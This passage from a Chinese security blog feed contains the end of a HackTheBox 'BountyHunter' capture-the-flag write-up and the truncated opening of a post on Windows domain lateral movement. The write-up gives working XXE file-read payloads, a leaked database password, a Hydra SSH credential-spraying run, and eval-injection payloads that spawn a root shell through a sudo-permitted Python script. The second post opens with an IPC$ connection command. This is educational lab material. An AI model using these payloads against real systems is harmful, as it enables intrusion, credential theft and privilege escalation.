class><p><code>å°è¯•è·å–/home/development/user.txtä½†æ˜¯å¤±è´¥äº†</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE demo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/development/user.txt&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;cwe&gt;demo&lt;/cwe&gt;</span><br><span class="line">        &lt;cvss&gt;demo&lt;/cvss&gt;</span><br><span class="line">        &lt;reward&gt;demo&lt;/reward&gt;</span><br><span class="line">        &lt;/bugreport&gt;</span><br><span class="line">        </span><br><span class="line">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2hvbWUvZGV2ZWxvcG1lbnQvdXNlci50eHQiPl0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+ZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M+CgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+</span><br><span class="line"></span><br><span class="line"><span class="meta">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2hvbWUvZGV2ZWxvcG1lbnQvdXNlci50eHQiPl0%</span><span class="bash">2bCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgoJCTxjd2U%2bZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M%2bCgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b</span></span><br></pre></td></tr></table></figure><img src="/2021/08/15/HTB-BountyHunter/image-20210815132827777.png" class><h2 id="0x06-è¯»å–db-php"><a href="#0x06-è¯»å–db-php" class="headerlink" title="0x06.è¯»å–db.php"></a>0x06.è¯»å–db.php</h2><p><code>ç”±äºå‰é¢å‘ç°äº†db.phpï¼Œä½†æ˜¯ä¸èƒ½æŸ¥çœ‹ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°è¯•è·å–db.phpæ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE demo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;cwe&gt;demo&lt;/cwe&gt;</span><br><span class="line">        &lt;cvss&gt;demo&lt;/cvss&gt;</span><br><span class="line">        &lt;reward&gt;demo&lt;/reward&gt;</span><br><span class="line">        &lt;/bugreport&gt;</span><br><span class="line">        </span><br><span class="line">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj5dPgoJCTxidWdyZXBvcnQ+CgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPmRlbW88L2N3ZT4KCQk8Y3Zzcz5kZW1vPC9jdnNzPgoJCTxyZXdhcmQ+ZGVtbzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==</span><br><span class="line"></span><br><span class="line"><span class="meta">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj5dPgoJCTxidWdyZXBvcnQ%</span><span class="bash">2bCgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPmRlbW88L2N3ZT4KCQk8Y3Zzcz5kZW1vPC9jdnNzPgoJCTxyZXdhcmQ%2bZGVtbzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3d%3d</span></span><br></pre></td></tr></table></figure><img src="/2021/08/15/HTB-BountyHunter/image-20210815133601924.png" class><p><code>è§£ç ï¼Œå¾—åˆ°æ•°æ®åº“ç”¨æˆ·å¯†ç </code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// TODO -&gt; Implement login system with the database.</span><br><span class="line"><span class="meta">$</span><span class="bash">dbserver = <span class="string">&quot;localhost&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbname = <span class="string">&quot;bounty&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbusername = <span class="string">&quot;admin&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbpassword = <span class="string">&quot;m19RoAU0hP41A1sTsq6K&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">testuser = <span class="string">&quot;test&quot;</span>;</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="0x07-çˆ†ç ´ssh"><a href="#0x07-çˆ†ç ´ssh" class="headerlink" title="0x07.çˆ†ç ´ssh"></a>0x07.çˆ†ç ´ssh</h2><blockquote><p>userï¼šdevelopment</p><p>passï¼šm19RoAU0hP41A1sTsq6K</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/BountyHunter]</span><br><span class="line">â””â”€# cat passwd.txt      </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">development:x:1000:1000:Development:/home/development:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/BountyHunter]</span><br><span class="line">â””â”€# cut -d : -f 1 passwd.txt &gt; userword.txt</span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/BountyHunter]</span><br><span class="line">â””â”€# cat userword.txt                       </span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br><span class="line">sync</span><br><span class="line">games</span><br><span class="line">man</span><br><span class="line">lp</span><br><span class="line">mail</span><br><span class="line">news</span><br><span class="line">uucp</span><br><span class="line">proxy</span><br><span class="line">www-data</span><br><span class="line">backup</span><br><span class="line">list</span><br><span class="line">irc</span><br><span class="line">gnats</span><br><span class="line">nobody</span><br><span class="line">systemd-network</span><br><span class="line">systemd-resolve</span><br><span class="line">systemd-timesync</span><br><span class="line">messagebus</span><br><span class="line">syslog</span><br><span class="line">_apt</span><br><span class="line">tss</span><br><span class="line">uuidd</span><br><span class="line">tcpdump</span><br><span class="line">landscape</span><br><span class="line">pollinate</span><br><span class="line">sshd</span><br><span class="line">systemd-coredump</span><br><span class="line">development</span><br><span class="line">lxd</span><br><span class="line">usbmux</span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/BountyHunter]</span><br><span class="line">â””â”€# hydra -L userword.txt -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-15 01:55:59</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.11.100:22/</span><br><span class="line">[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-15 01:56:17</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>sshç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/BountyHunter]</span><br><span class="line">â””â”€# ssh development@10.10.11.100</span><br><span class="line">The authenticity of host &#x27;10.10.11.100 (10.10.11.100)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.100&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">development@10.10.11.100&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun 15 Aug 2021 05:39:27 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:           0.0</span><br><span class="line">  Usage of /:            26.5% of 6.83GB</span><br><span class="line">  Memory usage:          35%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             266</span><br><span class="line">  Users logged in:       1</span><br><span class="line">  IPv4 address for eth0: 10.10.11.100</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:66fa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Aug 15 05:07:51 2021 from 10.10.16.38</span><br><span class="line">-bash-5.0$ pwd</span><br><span class="line">/home/development</span><br><span class="line">-bash-5.0$ ls</span><br><span class="line">code.md  contract.txt  exploit.md  readelf  strings  user.txt</span><br><span class="line">-bash-5.0$ cat user.txt </span><br><span class="line">**************************************</span><br><span class="line">-bash-5.0$</span><br></pre></td></tr></table></figure><h2 id="0x08-ææƒ"><a href="#0x08-ææƒ" class="headerlink" title="0x08.ææƒ"></a>0x08.ææƒ</h2><p><code>sudo -lææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ sudo -l</span><br><span class="line">Matching Defaults entries for development on bountyhunter:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User development may run the following commands on bountyhunter:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br><span class="line">bash-5.0$ </span><br></pre></td></tr></table></figure><p><code>å®¡è®¡ticketValidator.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">bash<span class="number">-5.0</span>$ cat /opt/skytrain_inc/ticketValidator.py</span><br><span class="line"><span class="comment">#Skytrain Inc Ticket Validation System 0.1</span></span><br><span class="line"><span class="comment">#Do not distribute this file.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_file</span>(<span class="params">loc</span>):</span></span><br><span class="line">    <span class="keyword">if</span> loc.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> open(loc, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Wrong file type.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate</span>(<span class="params">ticketFile</span>):</span></span><br><span class="line">    <span class="comment">#Evaluates a ticket to check for ireggularities.</span></span><br><span class="line">    code_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> enumerate(ticketFile.readlines()):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;# Skytrain Inc&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;## Ticket to &quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            print(<span class="string">f&quot;Destination: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(x.strip().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">3</span>:])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x.startswith(<span class="string">&quot;__Ticket Code:__&quot;</span>):</span><br><span class="line">            code_line = i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code_line <span class="keyword">and</span> i == code_line:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;**&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ticketCode = x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> int(ticketCode) % <span class="number">7</span> == <span class="number">4</span>:</span><br><span class="line">                validationNumber = eval(x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> validationNumber &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    fileName = input(<span class="string">&quot;Please enter the path to the ticket file.\n&quot;</span>)</span><br><span class="line">    ticket = load_file(fileName)</span><br><span class="line">    <span class="comment">#DEBUG print(ticket)</span></span><br><span class="line">    result = evaluate(ticket)</span><br><span class="line">    <span class="keyword">if</span> (result):</span><br><span class="line">        print(<span class="string">&quot;Valid ticket.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid ticket.&quot;</span>)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">bash<span class="number">-5.0</span>$ </span><br></pre></td></tr></table></figure><p><code>æ„å»ºdemo.md</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Skytrain Inc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Ticket to Lluna</span></span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**10+10+__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)**</span><br></pre></td></tr></table></figure><p><code>æˆ–è€…</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Skytrain Inc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Ticket to Lluna</span></span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**32+0+__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)**</span><br></pre></td></tr></table></figure><p><code>ææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ pwd</span><br><span class="line">/tmp</span><br><span class="line">bash-5.0$ cat demo.md</span><br><span class="line"><span class="meta">#</span><span class="bash"> Skytrain Inc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Ticket to Lluna</span></span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**18+10+__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)**</span><br><span class="line">bash-5.0$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br><span class="line">Please enter the path to the ticket file.</span><br><span class="line">demo.md</span><br><span class="line">Destination: Lluna</span><br><span class="line">root@bountyhunter:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@bountyhunter:/tmp# cd</span><br><span class="line">root@bountyhunter:~# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@bountyhunter:~# cat root.txt </span><br><span class="line">******************************************</span><br><span class="line">root@bountyhunter:~# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/08/15/HTB-BountyHunter/image-20210814200854065.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-åŸŸå†…æ¨ªå‘ç§»åŠ¨</title>
    <link href="https://lunamoore.github.io/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://lunamoore.github.io/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2021-08-14T05:32:08.000Z</published>
    <updated>2021-08-14T05:33:04.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Windowså¸¸ç”¨è¿œç¨‹è¿æ¥"><a href="#0x01-Windowså¸¸ç”¨è¿œç¨‹è¿æ¥" class="headerlink" title="0x01.Windowså¸¸ç”¨è¿œç¨‹è¿æ¥"></a>0x01.Windowså¸¸ç”¨è¿œç¨‹è¿æ¥</h2><h3 id="1-IPC"><a href="#1-IPC" class="headerlink" title="1.IPC"></a>1.IPC</h3><blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼Œå¼€å¯139ã€445ç«¯å£ï¼Œæ²¡æœ‰å…³é—­é»˜è®¤å…±äº«</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net use \\10.10.10.20\ipc$ &quot;11&quot; /user:administrator</span><br><span class="line">å‘½ä»¤æˆåŠŸå®Œæˆã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;net use</span><br><span class="line">ä¼šè®°å½•æ–°çš„ç½‘ç»œè¿æ¥ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çŠ¶æ€       